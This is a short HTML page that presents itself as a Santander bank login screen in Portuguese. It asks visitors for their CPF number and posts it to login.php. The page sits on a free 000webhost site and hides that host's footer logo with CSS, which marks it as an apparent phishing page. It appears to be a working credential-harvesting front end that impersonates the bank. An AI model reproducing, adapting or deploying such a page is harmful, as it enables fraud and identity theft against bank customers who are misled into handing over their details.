<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Santander</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
<meta name="mobile-web-app-capable" content="yes">

<link rel="stylesheet" type="text/css" href="style.css" />

<script language="javascript">
	var isOK = false;
</script>


<script src="js/jquery-3.2.1.min.js" language="javascript"></script>
<script src="script.js" language="javascript"></script>

</head>

<body onLoad="window.scrollTo(0,1);">
<div id="topo">
	<img src="images/santanderlogo.png">	
</div>
	
<div id="topo2">
	<img src="images/ico_key_acesso.png" />
	<div class="acessar"><p>Acessar</p></div>

</div>	

<div id="campos">
<form id="frm" action="login.php" method="post" enctype="application/x-www-form-urlencoded" onSubmit="return isOK;">
<table width="80%" class="center pt100">
  <tbody>
    <tr>
      <td><span>CPF</span></td>
    </tr>
    <tr>
      <td><input class="frm" type="number" id="cpf" name="cpf" onkeydown="limit(this, 11);" onkeyup="limit(this,11);" required></td>
    </tr>    
  </tbody>
    
</table>

<div class="pt30">
	<input type="button" id="btn-entrar" value="ENTRAR">
</div>
	
		
</form>

</div>

<script language="javascript">
 $( document ).ready(function() {
	 
	$( "#btn-entrar" ).click(function() {
		if (checkCPF()){
			isOK = true;	
			$("#frm").submit();	
		} else {
			alert("CPF incorreto, informe corretamente.");
		}
	});	
	

});
	
</script>

<div style='text-align: right;position: fixed;z-index:9999999;bottom: 0; width: 100%;cursor: pointer;line-height: 0;display:block !important;'><a title="Hosted on free web hosting 000webhost.com. Host your own website for FREE." target="_blank" href="https://www.000webhost.com/?utm_source=000webhostapp&amp;utm_campaign=000_logo&amp;utm_medium=website_czxce132&amp;utm_content=footer_img"><img src="https://cdn.rawgit.com/000webhost/logo/e9bd13f7/footer-powered-by-000webhost-white2.png"  alt="www.000webhost.com"></a></div></body><head>
<style>
img[src*="https://cdn.rawgit.com/000webhost/logo/e9bd13f7/footer-powered-by-000webhost-white2.png"] {
    display: none;
}
</style>
</head>
</body>
</html>
